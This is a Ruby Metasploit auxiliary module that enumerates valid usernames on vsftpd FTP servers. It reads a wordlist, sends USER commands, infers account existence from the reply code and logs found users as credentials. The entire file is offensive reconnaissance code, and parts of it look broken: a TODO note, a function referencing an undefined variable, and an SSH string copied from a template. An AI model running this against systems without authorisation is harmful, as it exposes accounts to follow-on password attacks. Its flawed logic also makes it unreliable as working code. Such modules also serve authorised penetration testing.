# TODO: Implement checks via banne grab
require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Ftp
  def initialize
    super(
      'Name'           => 'vsftpd Username Enumeration',
      'Version'        => '$Revision: 1 $',
      'Description'    => 'vsftpd username validator',
      'Author'         => ['z00nx', 'kenkeiras'],
      #Credit to kenkeiras because I used ssh_enumusers as a template
      'References'  =>
      [
        ['CVE', '2004-0042'],
        ['OSVDB', '6861'],
      ],
      'License'        => MSF_LICENSE
    )
    
    register_options(
      [
        OptPath.new('USER_FILE',
                    [true, 'File containing usernames, one per line', nil]),
      ], self.class
    )

    register_advanced_options(
      [
        OptInt.new('RETRY_NUM',
                   [true , 'The number of attempts to connect to a SSH server' \
                    ' for each user', 3]),
        OptBool.new('FTP_DEBUG',
                    [false, 'Enable FTP debugging output (Extreme verbosity!)',
                     false])
      ]
    )

    deregister_options('FTPUSER', 'FTPPASS', 'RHOST')
  end

  def retry_num
    datastore['RETRY_NUM']
  end

  def do_report(ip, user, port)
    service_data = {
      address: ip,
      port: rport,
      service_name: 'ftp',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: user,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def check_false_positive(ip)
    return(result == :success)
  end

  def peer(rhost=nil)
    "#{rhost}:#{rport} - FTP -"
  end

  def user_list
    if File.readable? datastore['USER_FILE']
      File.new(datastore['USER_FILE']).read.split
    else
      raise ArgumentError, "Cannot read file #{datastore['USER_FILE']}"
    end
  end

  def check_user(ip, user, port)
    conn = connect(false, datastore['VERBOSE'])
    res = send_user(user, conn)
    if (res !~ /^331/)
      :success
    else
      :fail
    end
  end

  def attempt_user(user, ip)
    attempt_num = 0
    ret = nil

    while attempt_num <= retry_num and (ret.nil? or ret == :connection_error)
      if attempt_num > 0
        Rex.sleep(2 ** attempt_num)
        vprint_status("#{peer(ip)} Retrying '#{user}' due to connection error")
      end

      ret = check_user(ip, user, rport)
      attempt_num += 1
    end

    ret
  end

  def show_result(attempt_result, user, ip)
    case attempt_result
    when :success
      print_good("#{peer(ip)} User '#{user}' found")
      do_report(ip, user, rport)
    when :connection_error
      print_error("#{peer(ip)} User '#{user}' on could not connect")
    when :fail
      print_error("#{peer(ip)} User '#{user}' not found")
    end
  end

  def run_host(ip)
    user_list.each{ |user| show_result(attempt_user(user, ip), user, ip) }
  end
end
